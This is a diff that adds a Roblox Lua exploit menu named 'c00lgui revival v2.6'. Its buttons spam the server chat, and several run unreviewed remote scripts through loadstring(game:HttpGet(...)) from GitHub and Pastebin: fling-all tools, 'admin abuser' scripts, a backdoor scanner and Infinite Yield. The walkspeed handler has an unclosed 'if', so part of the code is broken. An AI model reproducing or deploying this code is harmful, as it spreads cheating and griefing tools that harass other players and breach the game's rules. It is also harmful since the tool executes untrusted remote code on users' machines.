@@ -1,0 +1,244 @@
+local gui = Instance.new("ScreenGui",game.CoreGui)
+
+local main = Instance.new("Frame")
+main.Size = UDim2.new(0.3, 0, 0.74, 0)
+main.Position = UDim2.new(0.01, 0, 0.15, 0)
+main.BackgroundColor3 = Color3.new(0,0,0)
+main.BorderColor3 = Color3.new(1, 0, 0)
+main.BorderSizePixel = 3
+main.Active = true
+main.BackgroundTransparency = 0 
+main.Draggable = false
+main.Parent = gui
+
+
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1.0, 0, 0.09, 0)
+label.Position = UDim2.new(0.00, 0, -0.10, 0)
+label.BackgroundColor3 = Color3.new(0, 0, 0)
+label.BorderColor3 = Color3.new(1, 0, 0)
+label.BorderSizePixel = 3
+label.Text = "c00lgui revival v2.6"
+label.BackgroundTransparency = 0
+label.TextColor3 = Color3.new(255, 255, 255)
+label.Font = Enum.Font.SourceSans
+label.Parent = main
+label.TextScaled = true
+
+local ps = Instance.new("TextButton")
+ps.Size = UDim2.new(0.3, 0, 0.09, 0)
+ps.Position = UDim2.new(0.0, 0, 0.0, 0)
+ps.BackgroundColor3 = Color3.new(0, 0, 0)
+ps.BorderColor3 = Color3.new(1, 0, 0)
+ps.BorderSizePixel = 3
+ps.Text = "Floating Pad"
+ps.BackgroundTransparency = 0 
+ps.TextColor3 = Color3.new(255, 255, 255)
+ps.Font = Enum.Font.SourceSans
+ps.Parent = main
+ps.TextScaled = true
+ps.MouseButton1Down:Connect(function()
+  local name = game.Players.LocalPlayer.Name
+
+	local p = Instance.new("Part")
+	p.Parent = workspace
+	p.Locked = true
+	p.BrickColor = BrickColor.new("White")
+	p.BrickColor = BrickColor.new(104)
+	p.Size = Vector3.new(8, 1.2, 8)
+	p.Anchored = true
+	local m = Instance.new("CylinderMesh")
+	m.Scale = Vector3.new(1, 0.5, 1)
+	m.Parent = p
+	while true do
+		p.CFrame = CFrame.new(game.Players:findFirstChild(name).Character.Torso.CFrame.x, game.Players:findFirstChild(name).Character.Torso.CFrame.y - 4, game.Players:findFirstChild(name).Character.Torso.CFrame.z)
+		wait()
+	end
+end)
+
+local bc = Instance.new("TextButton")
+bc.Size = UDim2.new(0.3, 0, 0.09, 0)
+bc.Position = UDim2.new(0.31, 0, 0.0, 0)
+bc.BackgroundColor3 = Color3.new(0, 0, 0)
+bc.BorderColor3 = Color3.new(1, 0, 0)
+bc.BorderSizePixel = 3
+bc.Text = "Break Chat"
+bc.BackgroundTransparency = 0 
+bc.TextColor3 = Color3.new(255, 255, 255)
+bc.Font = Enum.Font.SourceSans
+bc.Parent = main
+bc.TextScaled = true
+bc.MouseButton1Down:Connect(function()
+	for i = 1, 70 do
+		local args = {
+    [1] = "\194\160",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+wait(1.2)
+	end
+end)
+local pc = Instance.new("TextButton")
+pc.Size = UDim2.new(0.37, 0, 0.09, 0)
+pc.Position = UDim2.new(0.62, 0, 0.0, 0)
+pc.BackgroundColor3 = Color3.new(0, 0, 0)
+pc.BorderColor3 = Color3.new(1, 0, 0)
+pc.BorderSizePixel = 3
+pc.Text = "Punch Fling"
+pc.BackgroundTransparency = 0 
+pc.TextColor3 = Color3.new(255, 255, 255)
+pc.Font = Enum.Font.SourceSans
+pc.Parent = main
+pc.TextScaled = true
+pc.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/fedoratums/Base-Script/Base-Script/fedoratum punch fling",true))()
+end)
+
+local ag = Instance.new("TextButton")
+ag.Size = UDim2.new(0.3, 0, 0.09, 0)
+ag.Position = UDim2.new(0.0, 0, 0.10, 0)
+ag.BackgroundColor3 = Color3.new(0, 0, 0)
+ag.BorderColor3 = Color3.new(1, 0, 0)
+ag.BorderSizePixel = 3
+ag.Text = "FE Audio Gui"
+ag.BackgroundTransparency = 0 
+ag.TextColor3 = Color3.new(255, 255, 255)
+ag.Font = Enum.Font.SourceSans
+ag.Parent = main
+ag.TextScaled = true
+ag.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/pedroluckygod/Yes/main/FEAG%20Gui"))("NotaPlayer214")
+end)
+
+local iy = Instance.new("TextButton")
+iy.Size = UDim2.new(0.3, 0, 0.09, 0)
+iy.Position = UDim2.new(0.31, 0, 0.10, 0)
+iy.BackgroundColor3 = Color3.new(0, 0, 0)
+iy.BorderColor3 = Color3.new(1, 0, 0)
+iy.BorderSizePixel = 3
+iy.Text = "Infinite Yield"
+iy.BackgroundTransparency = 0 
+iy.TextColor3 = Color3.new(255, 255, 255)
+iy.Font = Enum.Font.SourceSans
+iy.Parent = main
+iy.TextScaled = true
+iy.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end)
+
+local fa = Instance.new("TextButton")
+fa.Size = UDim2.new(0.37, 0, 0.09, 0)
+fa.Position = UDim2.new(0.62, 0, 0.10, 0)
+fa.BackgroundColor3 = Color3.new(0, 0, 0)
+fa.BorderColor3 = Color3.new(1, 0, 0)
+fa.BorderSizePixel = 3
+fa.Text = "Fling All"
+fa.BackgroundTransparency = 0 
+fa.TextColor3 = Color3.new(255, 255, 255)
+fa.Font = Enum.Font.SourceSans
+fa.Parent = main
+fa.TextScaled = true
+fa.MouseButton1Down:Connect(function()
+	 loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
+end)
+
+local box = Instance.new("TextBox")
+box.Size = UDim2.new(1.0, 0, 0.1, 0)
+box.Position = UDim2.new(0.0, 0, 0.9, 0)
+box.BackgroundColor3 = Color3.new(0, 0, 0)
+box.BorderColor3 = Color3.new(1, 0, 0)
+box.BorderSizePixel = 3
+box.Text = "Input"
+box.TextColor3 = Color3.new(255, 255, 255)
+box.BackgroundTransparency = 0
+box.Font = Enum.Font.SourceSansBold
+box.TextSize = 15
+box.Parent = main
+box.TextScaled = true
+
+local ws = Instance.new("TextButton")
+ws.Size = UDim2.new(0.3, 0, 0.09, 0)
+ws.Position = UDim2.new(0.0, 0, 0.2, 0)
+ws.BackgroundColor3 = Color3.new(0, 0, 0)
+ws.BorderColor3 = Color3.new(1, 0, 0)
+ws.BorderSizePixel = 3
+ws.Text = "Set Walkspeed"
+ws.BackgroundTransparency = 0 
+ws.TextColor3 = Color3.new(255, 255, 255)
+ws.Font = Enum.Font.SourceSans
+ws.Parent = main
+ws.TextScaled = true
+ws.MouseButton1Down:Connect(function()
+	local lcp = game.Players.LocalPlayer
+	local char = lcp.Character or lcp.CharacterAdded:Wait()
+	local humanoid = char.Humanoid
+	local nws = tonumber(box.Text)
+	if nws then
+	humanoid.WalkSpeed = nws
+end)
+
+local lh = Instance.new("TextButton")
+lh.Size = UDim2.new(0.3, 0, 0.09, 0)
+lh.Position = UDim2.new(0.31, 0, 0.2, 0)
+lh.BackgroundColor3 = Color3.new(0, 0, 0)
+lh.BorderColor3 = Color3.new(1, 0, 0)
+lh.BorderSizePixel = 3
+lh.Text = "LALOL HUB Backdoor"
+lh.BackgroundTransparency = 0 
+lh.TextColor3 = Color3.new(255, 255, 255)
+lh.Font = Enum.Font.SourceSans
+lh.Parent = main
+lh.TextScaled = true
+lh.MouseButton1Down:Connect(function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
+end)
+local fd = Instance.new("TextButton")
+fd.Size = UDim2.new(0.37, 0, 0.09, 0)
+fd.Position = UDim2.new(0.62, 0, 0.2, 0)
+fd.BackgroundColor3 = Color3.new(0, 0, 0)
+fd.BorderColor3 = Color3.new(1, 0, 0)
+fd.BorderSizePixel = 3
+fd.Text = "Fedora Admin"
+fd.BackgroundTransparency = 0 
+fd.TextColor3 = Color3.new(255, 255, 255)
+fd.Font = Enum.Font.SourceSans
+fd.Parent = main
+fd.TextScaled = true
+fd.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/alexx1212/fedoratoomutch/main/toomucth'))()
+end)
+local fe = Instance.new("TextButton")
+fe.Size = UDim2.new(0.3, 0, 0.09, 0)
+fe.Position = UDim2.new(0.0, 0, 0.3, 0)
+fe.BackgroundColor3 = Color3.new(0, 0, 0)
+fe.BorderColor3 = Color3.new(1, 0, 0)
+fe.BorderSizePixel = 3
+fe.Text = "Fedoratum Admin Abuser"
+fe.BackgroundTransparency = 0 
+fe.TextColor3 = Color3.new(255, 255, 255)
+fe.Font = Enum.Font.SourceSans
+fe.Parent = main
+fe.TextScaled = true
+fe.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/showcases/main/fedoratumadmin",true))()
+end)
+
+
+local ngui = Instance.new("ScreenGui",game.CoreGui)
+local x = Instance.new("TextButton")
+x.Size = UDim2.new(0.3, 0, 0.06, 0)
+x.Position = UDim2.new(0.01, 0, 0.9, 0)
+x.BackgroundColor3 = Color3.new(0, 0, 0)
+x.BorderColor3 = Color3.new(1, 0, 0)
+x.BorderSizePixel = 3
+x.Text = "Close"
+x.BackgroundTransparency = 0 
+x.TextColor3 = Color3.new(255, 255, 255)
+x.Font = Enum.Font.SourceSansBold
+x.Parent = ngui
+x.TextScaled = true
+x.MouseButton1Down:Connect(function()
+gui.Enabled = not gui.Enabled
+end)
